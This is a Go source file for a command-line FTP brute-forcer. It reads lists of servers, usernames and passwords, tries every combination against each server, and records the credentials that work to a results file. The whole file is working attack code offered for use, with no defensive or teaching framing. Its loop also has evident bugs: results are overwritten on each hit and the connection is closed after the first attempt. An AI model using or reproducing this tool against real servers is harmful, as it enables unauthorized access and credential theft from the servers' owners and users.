package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/jlaffaye/ftp"
)

func readlines(filename string) ([]string, error) {
	var result []string

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		result = append(result, scanner.Text())
	}
	return result, nil
}

func write_true(server, user, pass string) {
	file, _ := os.Create("result.txt")
	file.Write([]byte(server + "|" + user + ":" + pass))
}
func main() {
	var server string
	var username string
	var password string

	flag.StringVar(&server, "s", "server.txt", "path of server list")
	flag.StringVar(&username, "u", "username.txt", "path of username list")
	flag.StringVar(&password, "p", "password.txt", "path of password list")
	flag.Parse()
	server_list, _ := readlines(server)
	pass_list, _ := readlines(password)
	user_list, _ := readlines(username)
	for _, server := range server_list {
		c, err := ftp.Dial(server, ftp.DialWithTimeout(5*time.Second))
		if err != nil {
			fmt.Printf("\033[41mcant connect to server : %s \n", server)
		} else {
			for _, user := range user_list {
				for _, pass := range pass_list {
					err = c.Login(user, pass)
					if err != nil {
						fmt.Printf("\033[31mcant login to [%s] with username : %s | password %s\n ", server, user, pass)
					} else {
						write_true(server, user, pass)
						fmt.Printf("\033[36mlogin to \033[32m[\033[33m%s\033[32m]\033[36m with username : \033[33m%s \033[32m| \033[36mpassword \033[33m: %s \n", server, user, pass)
					}
					c.Quit()
				}
			}
		}
	}
}
